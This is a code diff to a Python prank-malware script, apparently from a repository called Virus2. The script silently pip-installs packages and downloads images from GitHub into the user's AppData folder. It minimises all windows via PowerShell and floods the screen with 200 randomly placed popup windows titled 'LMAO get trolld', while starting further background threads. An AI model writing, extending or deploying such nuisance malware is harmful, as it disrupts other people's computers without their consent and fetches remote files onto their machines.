@@ -15,9 +15,11 @@ while True:
             from datetime import datetime
             from tkinter import *
             from random import randrange
+            from PIL import Image
         except:
             os.system("pip install " + "requests")
             os.system("pip install " + "playsound==1.2.2")
+            os.system("pip install " + "pillow")
             import os
             import sys
             from os import path
@@ -29,6 +31,7 @@ while True:
             from datetime import datetime
             from tkinter import *
             from random import randrange
+            from PIL import Image
 
 
 
@@ -65,6 +68,16 @@ while True:
                         f.write(r.content)            
                     shutil.move('./lmao.png', AppDataPath)
                     #os.remove(AppDataPath + ".\\lmao.png")
+
+
+                if(path.exists(AppDataPath + "/lmao2.png")):
+                    0+0
+                else:
+                    r = requests.get("https://github.com/MEMESCOEP/Virus2/raw/main/lmao2.png")
+                    with open('./lmao2.png', 'wb') as f:
+                        f.write(r.content)            
+                    shutil.move('./lmao2.png', AppDataPath)
+                
 
                 #shutil.move('.\\lmao.mp3', AppDataPath)
                 #shutil.move('.\\lmao.png', AppDataPath)
@@ -108,9 +121,9 @@ pause
                 minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                 os.system(minData)
                 time.sleep(5)
-                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.maximizeall() }"""
-                os.system(minData)
-                time.sleep(5)
+                #minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.maximizeall() }"""
+                #os.system(minData)
+                #time.sleep(5)
 
 
 
@@ -133,31 +146,44 @@ pause
                         pth.start()
                         kth.start()
                         mth.start()
-                        #time.sleep(1)
-                        #pth = None          
-                        
-                        #kth = None
-
                     StartFunctions = False
-                    
-
-                    #os.system("taskkill /IM explorer.exe /F")
 
 
                     window = Tk()
-                    window.title('LMAO get neon catd lolololololololol')
+                    window.title('LMAO get trolld lolololololololol')
                     
-                    #window.resizable(False, False)            
+                    imagePaths = [Image.open(AppDataPath + "\\lmao.png"), Image.open(AppDataPath + "\\lmao2.png")]
+
+                    images = [PhotoImage(file=(AppDataPath + "\\lmao.png")), PhotoImage(file=(AppDataPath + "\\lmao2.png"))]
+                    
+                    window.resizable(False, False)            
                     canvas = Canvas(window, width = 1000, height = 300)
                     canvas.pack()
-                    my_image = PhotoImage(file=(AppDataPath + "\\lmao.png"))
+                    my_image = images[randrange(len(images) - 1)]  #PhotoImage(file=(AppDataPath + "\\lmao.png"))
                     #my_image.width = 10000
                     canvas.create_image(0, 0, anchor = NW, image=my_image)
                     for x in range(200):
+                        indeximg = randrange(len(images))
+                        
+
+                        img = imagePaths[indeximg] 
+  
+                        # get width and height
+                        width = img.width
+                        height = img.height
+                        
+                        # display width and height
+                        #print("The height of the image is: ", height)
+                        #print("The width of the image is: ", width)
+                        #print(indeximg)
+                        my_image = images[indeximg]                        
                         nw = Toplevel(window)
                         # get screen width and height
-                        w = 1000
-                        h = 300
+                        
+                        w = width
+                        h = height
+                        #print(int(w))
+                        #print(h)
 
                         # calculate x and y coordinates for the Tk root window
                         x = randrange(1281)
@@ -167,7 +193,6 @@ pause
                         canvas.pack()
                         canvas.create_image(0, 0, anchor = NW, image=my_image)
                         nw.geometry('%dx%d+%d+%d' % (w, h, x, y))
-
                         nw.update()
                     window.mainloop()
                 else:
@@ -184,8 +209,6 @@ pause
     except Exception as EX:
         print(EX)
         with open("loglmao.txt", "w") as f:
-            f.writelines(EX)
-        #time.sleep(1000)
-
+            f.writelines(str(EX))
 
 
